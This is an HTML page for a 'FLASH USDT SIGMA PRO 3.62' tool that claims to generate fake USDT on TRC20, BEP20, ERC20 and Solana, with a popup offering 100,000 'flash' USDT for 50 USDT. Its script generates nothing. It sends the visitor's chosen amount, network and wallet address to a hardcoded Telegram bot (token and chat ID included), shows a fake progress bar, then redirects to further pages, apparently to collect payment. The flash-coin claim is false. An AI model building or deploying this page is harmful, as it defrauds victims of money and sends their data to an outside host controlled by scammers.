<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FLASH USDT SIGMA ULTA 3.62</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      height: 100vh;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow: hidden;
    }

    video#bg-video {
      position: fixed;
      top: 0;
      left: 0;
      min-width: 100%;
      min-height: 100%;
      object-fit: cover;
      z-index: -1;
    }

    .container {
      background: rgba(255, 255, 255, 0.06);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 30px 20px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
      text-align: center;
      z-index: 1;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 20px;
    }

    select, input {
      width: 100%;
      padding: 10px;
      margin-top: 12px;
      border-radius: 10px;
      border: none;
      font-size: 16px;
    }

    input {
      background-color: #fff;
    }

    button {
      margin-top: 20px;
      background-color: #00bcd4;
      border: none;
      padding: 12px 20px;
      border-radius: 10px;
      cursor: pointer;
      color: white;
      font-size: 16px;
      font-weight: bold;
    }

    button:hover {
      background-color: #0097a7;
    }

    .loader {
      margin-top: 20px;
      height: 10px;
      background: #ccc;
      border-radius: 10px;
      overflow: hidden;
      display: none;
    }

    .loader-bar {
      height: 100%;
      width: 0%;
      background: #00e676;
      transition: width 0.2s;
    }

    #promo-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.85);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    #promo-popup .box {
      background: white;
      color: black;
      padding: 30px;
      border-radius: 20px;
      text-align: center;
      width: 90%;
      max-width: 350px;
    }

    #promo-popup del {
      color: red;
    }

    #promo-popup strong {
      color: green;
    }
  </style>
</head>
<body>

<!-- BACKGROUND VIDEO -->
<video autoplay muted loop id="bg-video">
  <source src="background.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

<!-- PROMO POPUP -->
<div id="promo-popup">
  <div class="box">
    <h2>Special Offer</h2>
    <p>For <strong>100,000 USDT</strong> Flash</p>
    <p>Old Price: <del>100 USDT</del></p>
    <p>New Price: <strong>50 USDT only!</strong></p>
    <button onclick="closePromo()">Continue</button>
  </div>
</div>

<!-- MAIN CONTAINER -->
<div class="container">
  <h1>FLASH USDT SIGMA PRO 3.62</h1>

  <label for="amount">Amount</label>
  <select id="amount">
    <option value="" disabled selected>Select amount</option>
    <option value="5000">5,000 USDT</option>
    <option value="20000">20,000 USDT</option>
    <option value="100000">100,000 USDT</option>
  </select>

  <label for="network">Network</label>
  <select id="network">
    <option value="" disabled selected>Select network</option>
    <option value="TRC20">TRC20</option>
    <option value="BEP20">BEP20</option>
    <option value="ERC20">ERC20</option>
    <option value="SOL">Solana (SOL)</option>
  </select>

  <label for="wallet">Wallet Address</label>
  <input type="text" id="wallet" placeholder="Enter your wallet address">

  <button onclick="generate()">Generate</button>

  <div class="loader" id="loader">
    <div class="loader-bar" id="loader-bar"></div>
  </div>
</div>

<script>
  function closePromo() {
    document.getElementById('promo-popup').style.display = 'none';
  }

  function generate() {
    const amount = document.getElementById('amount').value;
    const network = document.getElementById('network').value;
    const wallet = document.getElementById('wallet').value;

    if (!amount || !network || !wallet) {
      alert("Please complete all fields.");
      return;
    }

    // Show loader
    document.getElementById('loader').style.display = 'block';
    let progress = 0;
    const bar = document.getElementById('loader-bar');

    // Send to Telegram
    const message = `
FLASH USDT SIGMA 3.61
Amount: ${amount} USDT
Network: ${network}
Wallet: ${wallet}
    `;
    const botToken = "8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw";
    const chatId = "7739393558";

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    // Loader animation + redirect after 15s
    const interval = setInterval(() => {
      progress += 100 / 15;
      bar.style.width = progress + '%';

      if (progress >= 100) {
        clearInterval(interval);
        if (amount === "5000") {
          window.location.href = "page2.html";
        } else if (amount === "20000") {
          window.location.href = "page3.html";
        } else if (amount === "100000") {
          window.location.href = "page4.html";
        }
      }
    }, 1000);
  }
</script>

</body>
</html>
